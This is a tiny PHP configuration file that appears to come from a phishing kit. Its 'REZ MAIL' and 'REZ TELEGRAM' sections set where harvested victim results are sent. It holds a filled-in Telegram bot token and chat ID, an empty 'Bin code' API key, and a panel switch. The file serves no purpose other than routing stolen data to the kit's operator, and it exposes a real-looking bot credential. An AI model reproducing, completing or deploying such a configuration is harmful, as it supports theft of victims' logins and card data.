<?php

$api_key = ""; # Bin code 

# REZ MAIL

$email = "";

# REZ TELEGRAM

$token = "6320212857:AAH_i_RzIYK3BAvt-AMY6BNoT0NGAeBo7y8";
$chatid = "6116538518";

$panel = True;